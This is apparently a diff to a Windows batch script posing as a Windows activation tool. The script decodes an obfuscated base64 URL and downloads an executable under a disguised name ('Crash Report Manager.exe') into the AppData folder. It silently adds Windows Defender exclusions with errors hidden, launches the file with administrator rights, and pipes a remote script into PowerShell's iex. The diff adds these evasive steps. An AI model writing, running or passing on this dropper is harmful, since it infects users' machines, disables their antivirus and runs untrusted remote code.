@@ -11,32 +11,28 @@ if %errorlevel% neq 0 (
 
 set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
 for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
-set "filename=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Windows Defender.exe"
-set "folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
+:: Define the correct folder path - here we use the %APPDATA% folder instead of %programdata%
+set "folder=%APPDATA%\Microsoft"
+set "filename=%folder%\Crash Report Manager.exe"
+set "filename2=%folder%\Crash Report Info.exe"
+
+:: Try to add exclusions for Defender, but continue if it fails, suppressing errors
+powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename%' } catch { }" >nul 2>&1
+powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename2%' } catch { }" >nul 2>&1
+powershell -Command "try { Add-MpPreference -ExclusionPath '%folder%' } catch { }" >nul 2>&1
 
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
 
-
 if exist "%filename%" (
-
-    
-
-    powershell -Command "Add-MpPreference -ExclusionProcess '%filename%'"
-    powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
-
-
     powershell -Command "Start-Process '%filename%' -Verb runAs"
     
-   
     echo Running the external PowerShell command...
     powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
-
 ) else (
     echo Failed to download the file. Exiting.
     exit /b
 )
-
 
 echo The system needs to restart for the changes to take effect.
 echo Please wait while the system prepares for the restart...
